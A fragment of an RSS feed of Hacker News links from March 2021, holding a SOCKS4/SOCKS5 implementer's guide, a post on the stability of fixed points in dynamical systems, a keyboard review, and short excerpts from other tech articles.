tabindex="0"><div><div><p><img alt="Image of an apple, some book, crayons" src="https://miro.medium.com/max/7906/0*WItSN7T0lYfj_6P1" width="3953" height="2791" srcset="https://miro.medium.com/max/552/0*WItSN7T0lYfj_6P1 276w, https://miro.medium.com/max/1104/0*WItSN7T0lYfj_6P1 552w, https://miro.medium.com/max/1280/0*WItSN7T0lYfj_6P1 640w, https://miro.medium.com/max/1400/0*WItSN7T0lYfj_6P1 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*WItSN7T0lYfj_6P1?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@element5digital?utm_source=medium&amp;utm_medium=referral" rel="noopener">Element5 Digital</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="1ed7">In this day and age, being an efficient learner gives you an edge and sets you up for your career success. I’m a firm believer that you can get better at anything in life if you take the time to understand the process — and have the willingness to improve. Learning is no exception. It is a skill that can be improved with practice. And knowing what not to do is sometimes as important as knowing what to do when it comes to learning. Just like what Confucius, a Chinese social philosopher, once said:</p><blockquote><p id="e923">“Learning without thought is labor lost; thought without learning is perilous. “— Confucius</p></blockquote></div></div></section></div></div>]]>
            </description>
            <link>https://betterprogramming.pub/5-mistakes-to-avoid-when-learning-a-new-framework-or-programming-language-a8ba9c3f1160</link>
            <guid isPermaLink="false">hacker-news-small-sites-26353601</guid>
            <pubDate>Fri, 05 Mar 2021 06:42:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Implementer's Guide to Socks (Protocol)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26352945">thread link</a>) | @cookiengineer
<br/>
March 4, 2021 | https://cookie.engineer/weblog/articles/implementers-guide-to-socks.html | <a href="https://web.archive.org/web/*/https://cookie.engineer/weblog/articles/implementers-guide-to-socks.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
				<p>
	Yesterday I was verifying that the SOCKS test suite of 
	 <a href="https://github.com/tholian-network/stealth">Tholian Stealth</a> 
	is working and I realized that writing failsafe tests are not
	as easy as someone might think. So here's my write-up about
	the SOCKS protocol.
</p>
<p>
	The problem with SOCKS in a nutshell is that it is not as well
	documented as someone might think.
</p>
<p>
	Most people are even unaware of the role that a SOCKS proxy plays
	in between network connections and therefore don't know what exactly
	a SOCKS proxy can or cannot do in regards to blocking ads and malicious
	domains.
</p>
<p>
	So I thought that a reference-class article for SOCKS4 and SOCKS5
	would be nice, documenting its quirks and common pitfalls while
	implementing those protocols.
</p>
<p>
	For the implementation we're going to build in this article,
	we only need plain node.js and its 
	 <code>net</code>
	 core stack. The
	implementation will be peer-to-peer, which means it can be used
	for both the client-side and server-side whereas both sides are
	implemented in node.js for the sake of simplicity.
</p>
<h2>Introduction</h2>
<p>
	First off, you have to know that the 
	 <code>SOCKS</code>
	 protocol is specified as
	 <a href="https://tools.ietf.org/html/rfc1928">RFC1928</a> 
	 and
	 <a href="https://tools.ietf.org/html/rfc1929">RFC1929</a> 
	 and didn't change since
	 <code>1996</code>
	 so it's somewhat safe to assume that this is the final version
	of the network protocol.
</p>
<p>
	The SOCKS protocol in general and its role is pretty much what telephone
	operators did in the past. A client connects to the SOCKS proxy and
	requests to connect to a specific target. The proxy tries to connect
	to the target, and if it succeeds reaches through the connection to the
	client.
</p>
<pre>Client: Please let me connect to IP 1.2.3.4.
Proxy:  Trying to connect... please hold the line ...
Proxy:  Here's the connection handle, any further data will be dispatched through automatically.
</pre>
<pre>Client: Please let me connect to IP 1.2.3.4.
Proxy:  Trying to connect... please hold the line ...
Proxy:  Sorry, the given target is not reachable. Please try again later.
Proxy:  *hangs off the phone* Beep Beep Beep.
</pre>
<p>
	As both 
	 <code>SOCKS4</code>
	 and 
	 <code>SOCKS4a</code>
	 were proprietary protocols, they didn't
	have any RFC. 
	 <code>SOCKS5</code>
	 is referring a lot the 
	 <code>SOCKS4</code>
	 protocol and
	its featureset, so reading the RFC is quite complicated if you don't
	know what the older protocol versions actually did feature-wise.
</p>
<p>
	Usually though, most clients and servers that claim to support SOCKS5
	actually only support the 
	 <code>user</code>
	 and 
	 <code>password</code>
	 authentication, not
	the 
	 <code>IPv6</code>
	 or 
	 <code>DNS/UDP</code>
	 related features that come with it.
</p>
<p>
	This implementation will focus mostly on the 
	 <code>IPv4</code>
	 and 
	 <code>IPv6</code>
	differences and will - for the sake of simplicity - only support 
	 <code>TCP</code>
	based connections.
</p>
<p>
	The 
	 <code>SOCKS4</code>
	 featureset
	:
</p>
<ul>
	<li>connects to <code>IPv4</code> (TCP)</li>
</ul>
<p>
	The 
	 <code>SOCKS4a</code>
	 featureset
	:
</p>
<ul>
	<li>connects to <code>IPv4</code> (TCP)</li>
	<li>connects to <code>domain</code> (TCP)</li>
	<li>authentication via <code>user</code> is broken in practice (no password)</li>
</ul>
<p>
	The 
	 <code>SOCKS5</code>
	 featureset
	:
</p>
<ul>
	<li>connects to <code>IPv4</code> (TCP and UDP)</li>
	<li>connects to <code>IPv6</code> (TCP and UDP)</li>
	<li>connects to <code>domain</code> (TCP)</li>
	<li>authentication via <code>user</code> and <code>password</code></li>
</ul>
<h2>SOCKS Protocol and Network States</h2>
<p>
	Describing SOCKS data frames can be kind of complicated, because the
	interpretation of a SOCKS frame is different depending on its network
	state. So I'm trying to document the different network states first,
	so that you know what kind of states on both sides are possible.
</p>
<p>
	We are also going to completely ignore the 
	 <code>SOCKS authentication methods</code>
	,
	because they are broken across every single Browser; and implemented in
	specification violating non-secure non-encrypted manners across every
	piece of source code I've come across.
</p>
<h3>SOCKS Version 4</h3>
<p>
	The SOCKS 
	 <b>Version 4</b>
	 network flow looks like this
	:
</p>
<ul>
	<li>Client sends Connection Request Frame</li>
	<li>Server responds with a Status Frame</li>
</ul>
<p>... and that's pretty much it. Super simple.</p>
<p>
	 <b>SOCKS Version 4 Connection Request Frame</b>
	:
</p>
<pre>+---------+---------+----+----+----+----+----+----+----+----+....+----+
| VERSION | COMMAND | DSTPORT |      DSTIP        | USERID       |NULL|
+---------+---------+----+----+----+----+----+----+----+----+....+----+
     1         1         2              4           variable       1
</pre>
<ul>
	<li><code>VERSION</code> (1 byte) represents the <code>SOCKS version</code> , which can be either of <code>0x04</code> or <code>0x05</code> .</li>
	<li><code>COMMAND</code> (1 byte) represents the <code>SOCKS command</code> , which can be either of the Commands explained below.</li>
	<li><code>DSTPORT</code> (2 bytes) represents the destination port from <code>1</code> to <code>65535</code> .</li>
	<li><code>DSTIP</code> is an <code>IPv4</code> (4 bytes) represents the destination IP, and encodes 4 digits as <code>0x00</code> to <code>0xFF</code> respectively.</li>
	<li><code>USERID</code> (variable byte length, followed by a <code>NULL</code> terminator byte) represents an authentication mechanism for a user-login; but without a password.</li>
</ul>
<p>
	 <b>SOCKS Version 4 Commands</b>
	:
</p>
<ul>
	<li><code>0x01</code> represents <code>CONNECT</code> and is a TCP/IP connection request which lets the Server established the connection.</li>
	<li><code>0x02</code> represents <code>BIND</code> and is a TCP/IP port binding to allow the Client to establish the connection themselves.</li>
</ul>
<p>
	 <b>SOCKS Version 4 Connection Status Frame</b>
	:
</p>
<pre>+---------+--------+----+----+----+----+----+----+
| VERSION | STATUS | DSTPORT |      DSTIP        |
+---------+--------+----+----+----+----+----+----+
     1         1        2              4
</pre>
<ul>
	<li><code>VERSION</code> (1 byte) represents the <code>SOCKS version</code> , which can be either of <code>0x04</code> or <code>0x05</code> .</li>
	<li><code>STATUS</code> (1 byte) represents the <code>SOCKS status</code> , which can be either of the Status explained below.</li>
	<li><code>DSTPORT</code> (2 bytes) represents the destination port from <code>1</code> to <code>65535</code> .</li>
	<li><code>DSTIP</code> is an <code>IPv4</code> (4 bytes) represents the destination IP, and encodes 4 digits as <code>0x00</code> to <code>0xFF</code> respectively.</li>
</ul>
<p>
	 <b>SOCKS Version 4 Status Codes</b>
	:
</p>
<ul>
	<li><code>0x5A</code> Request granted.</li>
	<li><code>0x5B</code> Request rejected or failed.</li>
</ul>
<p>
	 <b>SOCKS Version 4 Status Codes for Authentication Mechanism</b>
	:
</p>
<p>(I would not recommend to implement them)</p>
<ul>
	<li><code>0x5C</code> Request failed because Client's <code>identd</code> is not reachable from server.</li>
	<li><code>0x5D</code> Request failed because Client's <code>identd</code> could not confirm the User ID.</li>
</ul>
<h3>SOCKS Version 5</h3>
<p>
	 <b>Important</b>
	:
	 The SOCKS Version 5 protocol is different in
	its network flow and data frame structure; and it has a
	reserved byte with a 
	 <code>0x00</code>
	 value where the SOCKS Version 4
	protocol would otherwise expect a non-NULL byte data.
</p>
<p>
	Additionally, the order of 
	 <code>Destination Port</code>
	 and 
	 <code>Destination Address</code>
	is different from the order specified in SOCKS Version 4.
</p>
<p>
	The SOCKS 
	 <b>Version 5</b>
	 network flow looks like this
	:
</p>
<ol>
	<li>Client and Server authenticate via handshake mechanism.</li>
	<li>Server authenticates or responds with error message.</li>
	<li>Client requests to connect or bind to an IPv4, IPv6 or domain.</li>
	<li>Server responds with connection status.</li>
</ol>
<p>
	 <b>SOCKS Version 5 Handshake Request Frame</b>
	:
</p>
<pre>+---------+----+----+----+....+
| VERSION | NMETHODS| METHODS |
+---------+----+----+----+....+
     1         2      variable
</pre>
<p>
	 <b>SOCKS Version 5 Handshake Response Frame</b>
	:
</p>
<pre>+---------+----+----+
| VERSION | METHOD  |
+---------+----+----+
     1         1
</pre>
<ul>
	<li><code>VERSION</code> (1 byte) represents the <code>SOCKS version</code> , which is <code>0x05</code> .</li>
	<li><code>NMETHODS</code> (1 byte) represents the byte length of the following encoded <code>METHOD</code> s.</li>
	<li><code>METHODS</code> (variable byte length) represents the encoded SOCKS methods.</li>
</ul>
<p>
	 <b>SOCKS Version 5 Handshake Methods</b>
	:
</p>
<ul>
	<li><code>0x00</code> represents No Authentication required.</li>
	<li><code>0x01</code> represents <code>GSSAPI</code> which is a "secure" context as defined per <a href="https://tools.ietf.org/html/rfc1961">RFC1961</a> .</li>
	<li><code>0x02</code> represents <code>username/password</code> plaintext authentication.</li>
	<li><code>0x80</code> to <code>0xFE</code> are reserved for private methods, but are never used in practice.</li>
	<li><code>0xFF</code> represents No Acceptable methods (in a response).</li>
</ul>
<p>
	 <b>SOCKS Version 5 Connection Request</b>
	:
</p>
<p>
	After the Client and Server have negotiated an Authentication Method,
	the Client sends a Connection Request Frame to the Server.
</p>
<pre>+---------+---------+-----+------+----+----+----+----+
| VERSION | COMMAND | RSV | ATYP | DSTADDR | DSTPORT |
+---------+---------+-----+------+----+----+----+----+
     1         1       1      1    variable     2
</pre>
<ul>
	<li><code>VERSION</code> (1 byte) represents the <code>SOCKS version</code> , which is <code>0x05</code> .</li>
	<li><code>COMMAND</code> (1 byte) represents either of the Commands explained below.</li>
	<li><code>RSV</code> (1 byte) represents the reserved byte which has to be <code>0x00</code> (to be able to differ it from a SOCKS Version 4 Connection Request).</li>
	<li><code>ATYP</code> (1 byte) represents the address type, which can be either of <code>0x01</code> (IPv4 address), <code>0x03</code> (domain name), <code>0x04</code> (IPv6 address).</li>
	<li><code>DSTADDR</code> (variable) represents the destination address as an IPv4 (in 4 octets), the domain name (with a prefixed byte length), or an IPv6 (in 16 octets).</li>
	<li><code>DSTPORT</code> (2 bytes) represents the destination port from <code>0x01</code> ( <code>1</code> ) to <code>0xFF</code> ( <code>65535</code> ).</li>
</ul>
<p>
	 <b>SOCKS Version 5 Commands</b>
	:
</p>
<ul>
	<li><code>0x01</code> represents <code>CONNECT</code> and is a TCP/IP connection request which lets the Server established the connection and forward further packets.</li>
	<li><code>0x02</code> represents <code>BIND</code> and is a TCP/IP port binding to allow the Client to establish the connection themselves.</li>
	<li><code>0x03</code> represents <code>UDP ASSOCIATE</code> and is a UDP associate request which lets the Server establish the connection and forward further packets.</li>
</ul>
<p>
	 <b>SOCKS Version 5 Connection Status Frame</b>
	:
</p>
<p>
	After the Client has sent the Connection Request frame, the Server responds
	with a Connection Status Frame.
</p>
<pre>+---------+-------+-----+------+----+----+----+----+
| VERSION | REPLY | RSV | ATYP | BNDADDR | BNDPORT |
+---------+-------+-----+------+----+----+----+----+
     1        1      1      1    variable     2
</pre>
<ul>
	<li><code>VERSION</code> (1 byte) represents the <code>SOCKS version</code> , which is <code>0x05</code> .</li>
	<li><code>REPLY</code> (1 byte) represents the reply message to the requested command and is either of the Replies explained below.</li>
	<li><code>RSV</code> (1 byte) represents the reserved byte which has to be <code>0x00</code> (to be able to differ it from a SOCKS Version 4 Connection Request).</li>
	<li><code>ATYP</code> (1 byte) represents the address type, which can be either of <code>0x01</code> (IPv4 address), <code>0x03</code> (domain name), <code>0x04</code> (IPv6 address).</li>
	<li><code>BNDADDR</code> (variable) represents the server-bound destination address as an IPv4 (in 4 octets), the domain name (with a prefixed byte length), or an IPv6 (in 16 octets).</li>
	<li><code>BNDPORT</code> (2 bytes) represents the server-bound destination port from <code>0x01</code> ( <code>1</code> ) to <code>0xFF</code> ( <code>65535</code> ).</li>
</ul>
<p>
	 <b>SOCKS Version 5 Replies</b>
	:
</p>
<ul>
	<li><code>0x00</code> Success</li>
	<li><code>0x01</code> General SOCKS Failure</li>
	<li><code>0x02</code> Connection Not Allowed</li>
	<li><code>0x03</code> Network Unreachable</li>
	<li><code>0x04</code> Host Unreachable</li>
	<li><code>0x05</code> Connection Refused</li>
	<li><code>0…</code></li></ul></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://cookie.engineer/weblog/articles/implementers-guide-to-socks.html">https://cookie.engineer/weblog/articles/implementers-guide-to-socks.html</a></em></p>]]>
            </description>
            <link>https://cookie.engineer/weblog/articles/implementers-guide-to-socks.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26352945</guid>
            <pubDate>Fri, 05 Mar 2021 05:03:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stability of Fixed Points of High Dimensional Dynamical Systems]]>
            </title>
            <description>
<![CDATA[
Score 62 | Comments 12 (<a href="https://news.ycombinator.com/item?id=26352308">thread link</a>) | @adipandas
<br/>
March 4, 2021 | https://adipandas.github.io/posts/2021/03/fixed-point-high-dim/ | <a href="https://web.archive.org/web/*/https://adipandas.github.io/posts/2021/03/fixed-point-high-dim/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><header><p> 5 minute read</p><p><strong> Published:</strong> <time datetime="2021-03-04T00:00:00-08:00">March 04, 2021</time></p></header><section itemprop="text"><p>In the <a href="https://adipandas.github.io/posts/2020/02/stable-unstable-fixed-point/">previous post</a>, I discussed the basics regarding the stability of fixed points of a dynamical system and explained it with a simple continuous-time one-dimensional example. In this post, I will discuss fixed points for a general case of a continuous-time $n$-dimensional system.</p><h4 id="fixed-point">Fixed point</h4><p>Just to reiterate, if the ordinary differential equation (ODE) in $\eqref{eq:1}$ represents a dynamical system:</p>\[\dot x = f(x) \label{eq:1}\]<p>Fixed points of this system are given by the roots of the equation $\eqref{eq:2}$:</p>\[\begin{equation} \dot x = f(x) = 0 \label{eq:2} \end{equation}\]<h2 id="fixed-points-of-multi-dimensional-system">Fixed points of Multi-dimensional system</h2><p>My <a href="https://adipandas.github.io/posts/2020/02/stable-unstable-fixed-point/">previous post</a> only explained the definition of fixed point and provided an example with a scalar-valued dynamical system. Now, lets discuss a case of multi-dimensional ODE.</p><p>We will start with the system given by equation $\eqref{eq:3}$:</p>\[\mathbf{\dot x} = \mathbf{f(x)} \label{eq:3}\]<p>where $\mathbf{f}$ is a vector-valued function, $\mathbf{x}$ and $\mathbf{\dot x}$ are $n$-dimensional vectors:</p>\[\mathbf{x, \dot x} \in \mathcal{R}^{n} \label{eq:4}\]<p>We find the fixed points (a.k.a. equilibrium states) of the system by following $\eqref{eq:2}$:</p>\[\mathbf{\dot x_{eq}} = \mathbf{f}(\mathbf{x_{eq}}) = \mathbf{0} \label{eq:5}\]<p>The roots of $\eqref{eq:5}$ will give us the value of $\mathbf{x_{eq}}$, i.e., fixed points of our multi-dimensional system.</p><h2 id="stable-and-unstable-fixed-points">Stable and Unstable Fixed Points</h2><p>We analyzed the system in a one-dimensional case (<a href="https://adipandas.github.io/posts/2020/02/stable-unstable-fixed-point/">here</a>) using a small perturbation $\delta$ at the equilibrium condition of the system. We will follow the similar procedure here as well.</p><p>We evaluated $\mathbf{f}^{\prime}\mathbf{(x)}$ at $\mathbf{x_{eq}}$ to see if our fixed point is stable or unstable. In case of one-dimensional system, it was easy since $f^{\prime}(x_{eq})&gt;0$ is unstable fixed point $x_{eq}$ while it is stable when $f^{\prime}(x_{eq})&lt;0$. In case of high-dimensional system, we cannot do this.</p><p>To analyze the behavior of our $n$-dimensional system at $\mathbf{x_{eq}}$, we will introduce the perturbation $\mathbf{\delta x}$ at $\mathbf{x_{eq}}$. Thus, we end up with the following:</p>\[\begin{align} \mathbf{\dot x_{eq} + \dot {\delta x}} &amp;= \mathbf{f(x_{eq}+\delta x)} \label{eq:6} \end{align}\]<p>Using Taylor expansion on $\eqref{eq:6}$:</p>\[\begin{align} \mathbf{\dot x_{eq} + \delta \dot x = f(x_{eq}) + f^{\prime}(x_{eq}) \delta x + f^{\prime \prime}(x_{eq}) \frac{\delta x^2}{2!} + \dots} \label{eq:7} \end{align}\]<p>But, we know at fixed points, equation $\eqref{eq:5}$ holds and thus, $\eqref{eq:7}$ reduces to $\eqref{eq:8}$.</p>\[\begin{align} \mathbf{ \delta \dot x = f^{\prime}(x_{eq}) \delta x + f^{\prime\prime}(x_{eq}) \frac{\delta x^2}{2!} + \dots} \end{align}\] \[\mathbf{ \delta \dot x = f^{\prime}(x_{eq}) \delta x + H.O.T. \label{eq:8}}\]<p>We can ignore the higher order terms $\mathbf{H.O.T.}$ for values of $\mathbf{\delta{x}}$ close to $\mathbf{0}$, resulting in equation $\eqref{eq:9}$.</p>\[\begin{align} \mathbf{\delta \dot x = f^{\prime}(x_{eq}) \delta x \label{eq:9}} \end{align}\]<p>$\mathbf{f}^{\prime}\mathbf{(x)}$ is the Jacobian of $\mathbf{f(x)}$ at $\mathbf{x_{eq}}$, i.e., a <strong>linear approximation</strong> of our dynamical system $\mathbf{f(x)}$ near $\mathbf{x_{eq}}$ (you can refer <a href="https://adipandas.github.io/posts/2020/03/vector-calculus/#jacobian-aka-derivative-of-vector-valued-function">this</a> for further details on Jacobian).</p>\[\begin{align} \mathbf{f}^{\prime}\mathbf{(x)} &amp;= \left[ \frac{\partial\mathbf{f}}{\partial x_{1}}, \frac{\partial\mathbf{f}}{\partial x_{2}}, \dots, \frac{\partial\mathbf{f}}{\partial x_{n}} \right] \label{eq:11}\\ \mathbf{f}^{\prime}\mathbf{(x)} &amp;= \begin{bmatrix} \frac{\partial{f_{1}}}{\partial x_{1}} &amp; \frac{\partial{f_{2}}}{\partial x_{2}} &amp; \dots &amp; \frac{\partial{f_{n}}}{\partial x_{n}}\\ \vdots &amp; \ddots &amp; \ddots &amp; \vdots \\ \frac{\partial{f_{n}}}{\partial x_{1}} &amp; \frac{\partial{f_{n}}}{\partial x_{2}} &amp; \dots &amp; \frac{\partial{f_{n}}}{\partial x_{n}}\\ \end{bmatrix} \label{eq:12} \end{align}\]<p>Using this Jacobian, equation $\eqref{eq:12}$, at our fixed point $\mathbf{x_{eq}}$ for the dynamical system under consideration, we can calculate its <a href="https://en.wikipedia.org/wiki/Eigenvalues_and_eigenvectors"><strong>eigenvalues</strong></a> and interpret the results of the fixed point.</p><p>Therefore, we find the eigenvalues for equation $\eqref{eq:13}$,</p>\[\begin{align} \mathbf{f}^{\prime}(\mathbf{x_{eq}}) \mathbf{x_{eq}} = \lambda \mathbf{x_{eq}} \label{eq:13} \end{align}\]<p>Here, $\lambda$ denotes the eigenvalue of the system. The roots of $\eqref{eq:13}$ are the eigenvalues the dynamical system at the fixed point $\mathbf{x}=\mathbf{x_{eq}}$.</p><h3 id="eigenvalue-interpretation-">Eigenvalue interpretation <a name="eigen_value_interpretation"></a></h3><p>For a continuous-time nonlinear dynamical system given by $\eqref{eq:3}$, the eigenvalues $\lambda$ that are found as roots of equation $\eqref{eq:13}$ can be interpreted as:</p><ul><li>If any of the eigenvalues have a real part $Re(\lambda)&gt;0$: $\mathbf{x_{eq}}$ is an unstable fixed point.</li><li>If all $Re(\lambda)&lt;0$: $\mathbf{x_{eq}}$ is a stable fixed point.</li><li>If $\lambda=0$: $\mathbf{x_{eq}}$ is a neutral fixed point.</li><li>If eigenvalues $\lambda$ are complex conjugates, i.e., $Im(\lambda) \ne 0$: The dynamical system has oscillatory behavior around the fixed point.</li></ul><h3 id="important-points-to-note-regarding-this-article">Important points to note regarding this article</h3><p>In this post, we discussed a general case of interpreting the fixed points of a dynamical system. By general, I mean $\mathbf{f(x)}$ is a non-linear, continuous-time vector-valued function representing a dynamical system. Below are certain points one should note about any non-linear dynamical system:</p><ul><li>We assumed that the system is non-linear and linearized it using Taylor series expansion near its fixed point (a.k.a. equilibrium).</li><li>We evaluated the stability of a fixed point <strong>near</strong> the equilibrium condition by perturbing the system ($\mathbf{x_{eq}}+\mathbf{\delta x}$).</li><li>This approach of interpreting the stability of the system by linearizing it near the equilibrium <strong>does not tell much</strong> about a system’s asymptotic behavior at large.<ul><li>We only understand how the system behaves <strong>locally</strong> or <strong>in the neighborhood of the fixed points</strong>.</li></ul></li><li>In practical or real-world systems, it may not be possible to interpret the global stability characteristics of the system. Thus, the stability analysis around the neighborhood of the fixed point is useful for many practical applications such as sustaining a non-linear system’s state near or at the fixed point.</li><li>In general, global asymptotic behaviors of any non-linear dynamical system can be complex and there are no systematic methods to predict and analyze such behaviors.</li></ul><h3 id="references-and-further-readings">References and Further Readings:</h3><ul><li>Deshpande, A. M. Stablility of Fixed Point of a Dynamical System. [<a href="https://adipandas.github.io/posts/2020/02/stable-unstable-fixed-point/">web</a>]</li><li>Strogatz, Steven H. Nonlinear dynamics and chaos with student solutions manual: With applications to physics, biology, chemistry, and engineering. CRC press, 2018.</li><li>Khalil, Hassan K. “Lyapunov stability.” <em>Control Systems, Robotics and AutomatioN–Volume XII: Nonlinear, Distributed, and Time Delay Systems-I</em> (2009): 115.</li><li>Bomze, Immanuel M., and Jörgen W. Weibull. “Does neutral stability imply Lyapunov stability?.” <em>Games and Economic Behavior</em> 11.2 (1995): 173-192.</li><li>Fixed point. [<a href="https://mathworld.wolfram.com/FixedPoint.html">web</a>]</li><li>Jacobian matrix [<a href="https://www.youtube.com/watch?v=bohL918kXQk">video</a>]</li><li>Stability Theory. [<a href="https://en.wikipedia.org/wiki/Stability_theory">web</a>]</li><li>Lyapunov Stability. [<a href="https://en.wikipedia.org/wiki/Lyapunov_stability">web</a>]</li></ul></section><!--<nav class="pagination"> <a href="https://adipandas.github.io/posts/2020/03/vector-calculus/" class="pagination--pager" title="Notes on Vector Calculus ">Previous</a> <a href="https://adipandas.github.io/posts/2021/03/biasvariancetradeoff/" class="pagination--pager" title="Bias, Variance and Trade-off ">Next</a></nav>--></div></div>]]>
            </description>
            <link>https://adipandas.github.io/posts/2021/03/fixed-point-high-dim/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26352308</guid>
            <pubDate>Fri, 05 Mar 2021 03:38:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Silence – GPL-Licensed Encrypted SMS/MMS for Android]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26352086">thread link</a>) | @jhabdas
<br/>
March 4, 2021 | https://git.silence.dev/Silence/Silence-Android/ | <a href="https://web.archive.org/web/*/https://git.silence.dev/Silence/Silence-Android/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<p data-sourcepos="1:1-1:46" dir="auto">A fork of Signal with only SMS/MMS encryption.</p>
</div>

</div></div>]]>
            </description>
            <link>https://git.silence.dev/Silence/Silence-Android/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26352086</guid>
            <pubDate>Fri, 05 Mar 2021 03:09:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Ultimate Hacking Keyboard: A long term report]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26351600">thread link</a>) | @azhenley
<br/>
March 4, 2021 | https://unhexium.net/hardware/the-ultimate-hacking-keyboard-months-of-use/ | <a href="https://web.archive.org/web/*/https://unhexium.net/hardware/the-ultimate-hacking-keyboard-months-of-use/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    
    <div>
      <p>In December of 2018 I finally received my UHK after months of waiting.</p>

<p>After using it daily since, I’m 100% convinced that the UHK is worth the asking price, probably more, and I’m happy that I got it at an early adopter discount.</p>

<p>Currently at $275 USD it’s definitely priced like the split ergonomic keyboard that it is, but what I think makes this one worth that is the open source, hackable nature of the keyboard.</p>

<p>Here’s my thoughts after using it as my daily driver for many months,</p>



<p>At first, I wasn’t a complete believer in Kailh keyswitches, but they’ve held up very well and show no signs of losing their feel. Still prefer Cherry for the desktop fullsize keyboards at home, but on the go and around school I’ve still had a good experience with these switches.</p>

<p>For some reason, they offered Cherry Clear and Cherry Green, no other Browns besides Kailh. Since I was planning on using this board to take notes in class, low noise was a high priority.</p>

<p>After a month or two, the switches were still a bit loud to use for notes in quiet lectures, so I bought and installed some generic o-rings which helped to reduce the keycap to board noise, but the springback action was still tell-tale sound of a mechanical keyboard.</p>

<p>Overall the feel of of the keyboard has been excellent and there’s been no hunting for keys as everything is exactly where I expect it to be.</p>



<p>The #1 eye-catching feature is for sure the splitting action.</p>

<p>I pull it out of a carrying case in one piece, and it looks whole, then it “appears I just rip my keyboard in half” as one fellow student commented.</p>

<p>But the aesthetics of the keyboard are nothing compared to how much better my carpal tunnel syndrome improved since using the UHK in place of my laptop keyboard. In fact, the primary reason I bought the UHK was to deal with carpal tunnel and I’m impressed how I’ve recovered without losing any real productivity.</p>

<p>I suspect the largest contributing factor to my development of CT was the usage of the trackpad on my laptop. Having to twist my hand and finger to move from keyboard use to having my thumb at the nearest edge of the laptop for pressing mouse buttons was likely the repetitive strain that triggered it.</p>

<p>While split, I never need to move my wrists, instead, I move the keyboard so that it’s exactly where my hands want to rest naturally. Problem solved.</p>



<p><img src="https://unhexium.net/images/uhk/desk1cut.jpg" alt=""></p>

<p>While splitting is certainly the most eye-catching features of the UHK, the LED display and steel plate construction also make it look (and feel) very premium.</p>

<p>You can of course order different colors of cases, mine being red, but the option exists such that I could easily grab a second case and customize it with paint or other mods.</p>

<p>In the future I will likely switch out the cable and keycaps to suit whatever design preferences I might have accumulated then.</p>



<p>In the first month of usage I had to change the ordering of the bottom modifier keys in order to reduce the reach strain from my most common shortcuts, I currently have them laid out as:</p>

<div><div><pre><code>Ctrl Super Fn Alt Mod || Space Super Alt Fn Ctrl
</code></pre></div></div>

<p>The goal here was to keep Super close to the right thumb and Alt close to the left thumb, because <code>Super-</code> is my window management base on Pop_OS! and Alt is used for switching terminal panes (where the right hand applies arrow keys I/HJKL) and managing textual multi-cursor.</p>

<p>It was super easy to just pop the keys off, rearrange, and reconfigure in UHK Agent.</p>

<p>I doubt I’m in the majority here, but when I touch type I used to hit the <code>Y</code> key with my left hand, since the UHK though it’s forced me to fix that habit and use the closer hand.</p>



<p>Currently my biggest gripe out of the whole experience is the mini USB connector method.</p>

<p>The connector itself is better than micro USB, but the placement of the connector underneath the top flange should have a better method of securing it instead of a simple cable pinch hole. The cable almost never stays stuck in the hole and often just causes more stress as a bend point.</p>

<p>I would love a switch to type-C with a latch mechanism, or even just keeping the connector outward facing like the RJ11 bridge would be fine.</p>

<p>After the connector, my only other problem is that the bridge cable gets squished whenever I place the keyboard inside a sleeve. I can’t immediately come up with a solution for this, since the extra slack in the already curled cable is definitely needed, but you should note to buy a case with a little more room vertically if you don’t want a squished looking bridge cable.</p>

      
    </div><!-- /.entry-content -->
  </article></div>]]>
            </description>
            <link>https://unhexium.net/hardware/the-ultimate-hacking-keyboard-months-of-use/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26351600</guid>
            <pubDate>Fri, 05 Mar 2021 02:08:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Production Machine Learning Fails – and How to Fix It]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26350953">thread link</a>) | @rkearns
<br/>
March 4, 2021 | https://www.montecarlodata.com/why-production-machine-learning-fails-and-how-to-fix-it/ | <a href="https://web.archive.org/web/*/https://www.montecarlodata.com/why-production-machine-learning-fails-and-how-to-fix-it/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <div>
          
<p><em>Machine learning has emerged as a must-have tool for any serious data team: augmenting processes, generating smarter and more accurate predictions, and generally improving our ability to make use of data.</em></p>



<p><em>However, discussing applications of ML in theory is much different than actually applying ML models at scale in production. In this article, we walk through common challenges and corresponding solutions to making ML a force multiplier for your data organization.&nbsp;</em></p>



<p>From generating your weekend bike route on Google Maps to helping you discover your next binge-worthy show on Netflix, machine learning (ML) has evolved well beyond a theoretical buzzword into a powerful technology that most of us use every day.&nbsp;</p>



<p>For the modern business, the appetite for ML has never been stronger. But while certain industries have been transformed by the automation made possible by ML—think <a href="https://www.businessinsider.com/ai-in-banking-report" target="_blank" rel="noopener">fraud detection</a> in finance and <a href="https://customerthink.com/explained-working-and-advantages-of-a-recommendation-engine/" target="_blank" rel="noopener">personalized product recommendations</a> in e-commerce—the hard truth is that many ML projects fail before they ever see the light of day.&nbsp;</p>



